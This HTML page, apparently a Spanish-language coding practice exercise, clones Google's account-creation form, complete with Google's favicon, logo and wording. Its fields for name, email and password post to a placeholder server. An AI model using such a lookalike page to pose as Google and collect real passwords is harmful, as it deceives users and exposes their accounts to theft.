<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- icon -->
    <link rel="shortcut icon" href="//www.google.com/favicon.ico">
    <!-- fonts -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans&display=swap" rel="stylesheet"> 

    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans&family=Roboto:wght@300&display=swap" rel="stylesheet">
    

      <!-- css -->
    <link rel="stylesheet" href="style.css">
    <title>Document</title>
</head>
<body onkeydown="onKeyDown(event)">
    <main>
        <img src="./assets/gglelogo.png" alt="google-logo">
        <h1>Crear tu cuenta de Google</h1>
        <h3>Ir a Gmail</h3>

        <div class="inputs-containers">
                                    <!--url del servidor  -->
            <form  name="formulario" action="mi_servidor" method="POST" target="_blank" autocomplete="off">
                <!-- container para separar los inputs del submit y que permita a la variable de js solo seleccionar los hijos de este container -->
                <div class="inputs-container" id="inputs-container">    
                    <div class="flex-container">
                        <label for="name">
                            <input type="text" id="name" class="inputs-txt" name="Nombre"  autofocus required>
                        </label>
                        <label for="last-name">
                            <input type="text" id="last-name" class="inputs-txt" name="Apellido" required>
                        </label>
                    </div>

                    <div class="flex-container">
                        <label for="username">
                            <input type="email" id="username" class="inputs-txt" name="Usuario" required list="suggest">
                        </label>
                        <datalist id="suggest">
                            <option value="usuario@hotmail.com"></option>
                            <option value="otrousuario@gmail.com"></option>
                            <option value="esteusuario@yahoo.com"></option>
                            <option value="proximousuario@outlook.com"></option>
                            <option value="ultimousuario@gmail.com"></option>
                        </datalist>
                        <span>
                            Puedes usar letras, numeros y signos de puntuacion
                        </span>
                    </div>
                    
                    <div class="flex-container">
                        <label for="password">
                            <input type="password" id="password" class="inputs-txt" name="Contrasena" required>
                        </label>
                        <label for="confirmation">
                            <input type="password" id="confirmation" class="inputs-txt" name="Confirmacion"   required>
                        </label>
                        <label for="checkbox" id="checkbox-container">
                            <input type="checkbox" name="mostrarContrasena" id="checkbox">
                            <span>Mostrar Contrasena</span>
                        </label>

                    </div>
                </div>

                <div class="flex-container">
                    <label for="submit">
                        <input type="submit" id="submit" value="Siguiente" onclick="sending()">
                    </label>
                    <a href="" title="vinculo a login"> 
                        Acceder a tu cuenta en su lugar
                    </a>
                </div>
            </form>     
        </div>
    </main>
    <footer>
    </footer>
</body>
  <!-- js -->
  <script src="./practicas.js"></script>
</html>
